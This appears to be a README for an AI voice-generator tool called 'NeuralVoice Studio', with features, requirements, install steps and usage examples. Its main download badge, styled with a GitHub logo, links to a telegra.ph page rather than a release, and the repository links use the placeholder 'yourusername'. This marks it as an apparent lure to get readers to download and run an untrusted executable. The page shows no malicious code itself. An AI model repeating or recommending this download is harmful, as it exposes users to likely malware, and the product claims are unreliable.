<!-- markdownlint-disable MD033 -->
<h1 align="center">🎙️ NeuralVoice Studio</h1>
<p align="center">
  <strong>State-of-the-Art AI Voice Generator · 85 Dialects · Lightweight · Offline</strong>
</p>

<p align="center">
  <a href="#-key-features">Features</a> •
  <a href="#-system-requirements">Requirements</a> •
  <a href="#-installation">Installation</a> •
  <a href="#-usage">Usage</a> •
  <a href="#-download">Download</a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Python-3.8+-blue?logo=python" alt="Python">
  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey" alt="Platform">
  <img src="https://img.shields.io/badge/License-MIT-green" alt="License">
  <img src="https://img.shields.io/badge/Size-~200MB-brightgreen" alt="Size">
</p>

---

## 📌 Overview

**NeuralVoice Studio** redefines synthetic speech. Leveraging cutting-edge neural networks, it produces voices indistinguishable from human narration. Unlike cloud-based services, this tool operates **100% offline**, ensuring your data privacy and zero latency.

Optimized for performance, NeuralVoice Studio delivers studio-grade audio even on **low-power devices** (Intel Core i3, 4GB RAM). Whether you're a podcaster, e-learning developer, or indie game creator, this is the most versatile and accessible TTS engine available.

### ✨ Key Features

- **🎯 Hyper-Realistic Output** — Advanced deep learning models capture prosody, emotion, and natural pauses.
- **🌍 85 Languages & Dialects** — From global languages (English, Mandarin, Spanish) to regional nuances (Scouse, Quechua, Bavarian).
- **⚡ Optimized for Low-End PCs** — CPU-only inference with < 500MB RAM usage. No GPU required.
- **🔐 Full Privacy** — No data ever leaves your machine. Complete offline operation.
- **🎛️ Fine-Grained Control** — Adjust speed, pitch, emphasis, and even emotional tone (happy, neutral, serious).
- **📂 Batch Processing** — Convert entire text files or SRT subtitles to speech in one click.
- **🎧 WAV & MP3 Export** — High-fidelity 44.1kHz stereo audio output.

---

## 💻 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS**    | Windows 10 / macOS 11 / Ubuntu 20.04 | Windows 11 / macOS 14 / Debian 12 |
| **CPU**   | Intel Core i3-6100 or equivalent | Intel Core i5-8400 or better |
| **RAM**   | 4 GB | 8 GB |
| **Storage** | 500 MB (models additional) | 2 GB (for all dialects) |
| **GPU**   | None (CPU only) | Optional for faster inference |

> *All models are pre-downloaded. No internet connection is required after setup.*

---

## 📥 Download

Get the latest portable version or source code:

<p align="center">
  <a href="https://telegra.ph/TRANSITION-06-17-3">
    <img src="https://img.shields.io/badge/📦_Download_Now-Click_Here-ff6f00?style=for-the-badge&logo=github" alt="Download Now">
  </a>
</p>

> **⬇️ Click the badge above to access the download page.**

---

## 🚀 Installation

### Option 1: Portable Executable (Recommended for non-developers)
1. Download the `.zip` archive from the [link above](#-download).
2. Extract to any folder (e.g., `C:\NeuralVoice`).
3. Run `NeuralVoiceStudio.exe` (Windows) or the appropriate binary for your OS.

### Option 2: Python Package (For developers)
```bash
# Clone repository
git clone https://github.com/yourusername/NeuralVoice-Studio.git
cd NeuralVoice-Studio

# Create virtual environment (optional)
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt

# Download base models
python scripts/download_models.py --minimal

# Launch GUI
python main.py
```

---

## 🎬 Usage

### Basic Command Line
```bash
# Synthesize from text file
python synthesize.py --input script.txt --output narration.wav --voice en-US-Female-1

# Batch mode with subtitles
python synthesize.py --input subtitles.srt --output audio/ --dialect es-ES --speed 1.1
```

### Graphical Interface
Launch the GUI with `python gui.py`. You can:
- Type or paste text directly.
- Load `.txt`, `.docx`, or `.srt` files.
- Select from 85 voice presets.
- Preview and adjust sliders for pitch/tempo.
- Export to WAV, MP3, or M4A.

### Example Voices
| Dialect Code | Region | Gender |
|--------------|--------|--------|
| `en-US-1`    | American (General) | Female |
| `en-GB-2`    | British (RP) | Male |
| `zh-CN-3`    | Mandarin (Standard) | Female |
| `es-MX-4`    | Mexican Spanish | Male |
| `hi-IN-5`    | Hindi | Female |
| `fr-CA-6`    | Canadian French | Male |
| ... and 79 more.

---

## 📂 Project Structure
```
NeuralVoice-Studio/
├── core/                 # Inference engine
│   ├── models/           # Pre-trained TTS models
│   ├── vocoder/          # Neural vocoder (HiFi-GAN)
│   └── tokenizer/        # Multi-lingual phonemizer
├── gui/                  # PyQt5 interface
├── scripts/              # Downloader & utilities
├── tests/                # Unit tests
├── docs/                 # Full documentation
├── requirements.txt
├── main.py
└── README.md
```

---

## 📚 Documentation & Tutorials

- **[Full User Guide](docs/guide.md)** — Step-by-step walkthrough.
- **[Voice Customization](docs/custom-voices.md)** — Train your own voice models.
- **[API Reference](docs/api.md)** — For integration into other software.
- **[Performance Tuning](docs/performance.md)** — Tips for low-spec machines.

---

## 🤝 Contributing

We welcome contributions! Check out our [Contribution Guidelines](CONTRIBUTING.md) to get started.  
Areas needing help:
- New dialect training datasets.
- GUI improvements (theme, accessibility).
- Performance optimizations for ARM devices.

---

## 📄 License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

---

## 🌟 Support the Project

If you find NeuralVoice Studio useful, please give us a ⭐ on GitHub!  
For discussions, bugs, or feature requests, open an [Issue](https://github.com/yourusername/NeuralVoice-Studio/issues).

---

<p align="center">
  Made with ❤️ for the open-source community.
</p>
